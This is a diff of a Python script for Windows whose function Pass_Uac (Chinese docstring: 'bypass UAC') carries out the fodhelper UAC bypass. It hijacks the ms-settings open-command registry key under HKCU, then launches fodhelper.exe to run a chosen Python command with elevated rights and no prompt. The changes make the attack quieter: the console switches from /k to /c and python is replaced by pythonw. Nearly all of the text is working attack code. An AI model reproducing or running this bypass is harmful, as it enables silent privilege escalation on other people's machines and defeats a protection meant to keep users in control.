@@ -1,16 +1,24 @@
 import sys
 import os
 import ctypes
-import wincommon
+import subprocess
 
 if sys.version_info[0] == 3:
     import winreg as winreg
 else:
     import _winreg as winreg
 
-CMD = wincommon.GetExePath("cmd")
-FOD_HELPER = wincommon.GetExePath("fodhelper")
-PYTHON_CMD = wincommon.GetExePath("python")
+
+def GetExePath(exename):
+    # 获取命令绝对路径
+    # 返回
+    exitcode, output = subprocess.getstatusoutput('where ' + exename)
+    return output
+
+
+CMD = GetExePath("cmd")
+FOD_HELPER = GetExePath("fodhelper")
+PYTHON_CMD = GetExePath("pythonw")
 REG_PATH = r'Software\Classes\ms-settings\shell\open\command'
 DELEGATE_EXEC_REG_KEY = 'DelegateExecute'
 
@@ -34,7 +42,7 @@ def Pass_Uac(startinfo):
     绕过uac
     '''
     try:
-        cmd = '{} /k {} {}'.format(CMD, PYTHON_CMD, startinfo)
+        cmd = '{} /c {} {}'.format(CMD, PYTHON_CMD, startinfo)
         # winreg.CreateKey(winreg.HKEY_CURRENT_USER, REG_PATH)
         # registry_key = winreg.OpenKey(
         #     winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_WRITE)
@@ -47,7 +55,7 @@ def Pass_Uac(startinfo):
             winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_WRITE)
         winreg.SetValueEx(registry_key, None, 0, winreg.REG_SZ, cmd)
         winreg.CloseKey(registry_key)
-        
+
         os.system(FOD_HELPER)
         sys.exit(0)
     except WindowsError:
